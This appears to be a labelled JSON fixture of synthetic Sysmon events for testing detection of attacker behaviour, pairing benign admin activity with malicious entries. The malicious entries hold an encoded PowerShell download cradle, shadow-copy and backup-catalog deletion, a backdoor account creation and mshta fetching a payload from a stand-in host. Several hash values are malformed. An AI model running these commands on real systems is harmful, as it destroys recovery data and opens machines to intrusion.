[
  {
    "_comment": "MALICIOUS: PowerShell with encoded command - classic fileless delivery (T1059.001)",
    "_label": "malicious",
    "_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c start payload.bat",
    "User": "CORP\\jdoe",
    "ProcessId": 4892,
    "ParentProcessId": 3210,
    "Hashes": "MD5=7C4A8D09CA3762AF61E59520943DC26494F8941B",
    "CurrentDirectory": "C:\\Users\\jdoe\\Desktop",
    "UtcTime": "2026-06-01T03:55:12.000Z"
  },
  {
    "_comment": "MALICIOUS: vssadmin delete shadows - ransomware pre-encryption (T1490)",
    "_label": "malicious",
    "_technique": "T1490 - Inhibit System Recovery",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\vssadmin.exe",
    "CommandLine": "vssadmin.exe delete shadows /all /quiet",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c vssadmin.exe delete shadows /all /quiet",
    "User": "NT AUTHORITY\\SYSTEM",
    "ProcessId": 5120,
    "ParentProcessId": 5000,
    "Hashes": "MD5=AABBCCDD00112233445566778899AABB",
    "CurrentDirectory": "C:\\",
    "UtcTime": "2026-06-01T04:01:00.000Z"
  },
  {
    "_comment": "MALICIOUS: wbadmin delete catalog - ransomware backup removal (T1490)",
    "_label": "malicious",
    "_technique": "T1490 - Inhibit System Recovery",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\wbadmin.exe",
    "CommandLine": "wbadmin.exe delete catalog -quiet",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c wbadmin delete catalog -quiet",
    "User": "NT AUTHORITY\\SYSTEM",
    "ProcessId": 5130,
    "ParentProcessId": 5000,
    "Hashes": "MD5=11223344AABBCCDD99887766554433221",
    "CurrentDirectory": "C:\\",
    "UtcTime": "2026-06-01T04:01:05.000Z"
  },
  {
    "_comment": "MALICIOUS: net user add - creating backdoor account (T1136.001)",
    "_label": "malicious",
    "_technique": "T1136.001 - Create Account: Local Account",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\net.exe",
    "CommandLine": "net user backdoor P@$$w0rd123 /add",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "User": "NT AUTHORITY\\SYSTEM",
    "ProcessId": 5200,
    "ParentProcessId": 5000,
    "Hashes": "MD5=99AABB00112233445566778899AABBCC",
    "CurrentDirectory": "C:\\",
    "UtcTime": "2026-06-01T04:05:00.000Z"
  },
  {
    "_comment": "MALICIOUS: mshta.exe executing remote HTA file - living off the land",
    "_label": "malicious",
    "_technique": "T1218.005 - System Binary Proxy Execution: Mshta",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta.exe http://evil.example.com/payload.hta",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe -nop -w hidden",
    "User": "CORP\\jdoe",
    "ProcessId": 5300,
    "ParentProcessId": 4892,
    "Hashes": "MD5=DDEEFF001122334455667788",
    "CurrentDirectory": "C:\\Users\\jdoe\\AppData\\Roaming",
    "UtcTime": "2026-06-01T03:58:00.000Z"
  },
  {
    "_comment": "BENIGN: PowerShell opening VS Code terminal (developer workstation)",
    "_label": "benign",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoLogo -NonInteractive",
    "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft VS Code\\Code.exe\"",
    "User": "CORP\\alice",
    "ProcessId": 7800,
    "ParentProcessId": 7000,
    "Hashes": "MD5=7C4A8D09CA3762AF61E59520943DC26494F8941B",
    "CurrentDirectory": "C:\\Users\\alice\\projects\\myrepo",
    "UtcTime": "2026-06-01T09:10:00.000Z"
  },
  {
    "_comment": "BENIGN: Windows Update (legitimate wbadmin usage)",
    "_label": "benign",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\wbadmin.exe",
    "CommandLine": "wbadmin.exe start backup -backupTarget:\\\\backupserver\\backups$ -include:C: -allCritical",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "User": "NT AUTHORITY\\SYSTEM",
    "ProcessId": 3400,
    "ParentProcessId": 688,
    "Hashes": "MD5=11223344AABBCCDD99887766554433221",
    "CurrentDirectory": "C:\\Windows\\System32",
    "UtcTime": "2026-06-01T02:00:00.000Z"
  },
  {
    "_comment": "BENIGN: IT admin running vssadmin to check shadow copy status",
    "_label": "benign",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\vssadmin.exe",
    "CommandLine": "vssadmin.exe list shadows",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "User": "CORP\\it-admin",
    "ProcessId": 4400,
    "ParentProcessId": 4300,
    "Hashes": "MD5=AABBCCDD00112233445566778899AABB",
    "CurrentDirectory": "C:\\Windows\\System32",
    "UtcTime": "2026-06-01T10:30:00.000Z"
  },
  {
    "_comment": "BENIGN: Legitimate PowerShell used by SCCM for software deployment",
    "_label": "benign",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\SCCM\\deploy_app.ps1",
    "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
    "ParentCommandLine": "CcmExec.exe",
    "User": "NT AUTHORITY\\SYSTEM",
    "ProcessId": 6000,
    "ParentProcessId": 5900,
    "Hashes": "MD5=7C4A8D09CA3762AF61E59520943DC26494F8941B",
    "CurrentDirectory": "C:\\ProgramData\\SCCM",
    "UtcTime": "2026-06-01T08:00:00.000Z"
  },
  {
    "_comment": "BENIGN: cmd.exe launched by Explorer (user double-clicked a .bat file)",
    "_label": "benign",
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c \"C:\\scripts\\daily_report.bat\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
    "User": "CORP\\bob",
    "ProcessId": 8800,
    "ParentProcessId": 1000,
    "Hashes": "MD5=FFEEDDCCBBAA00998877665544332211",
    "CurrentDirectory": "C:\\scripts",
    "UtcTime": "2026-06-01T09:00:00.000Z"
  }
]
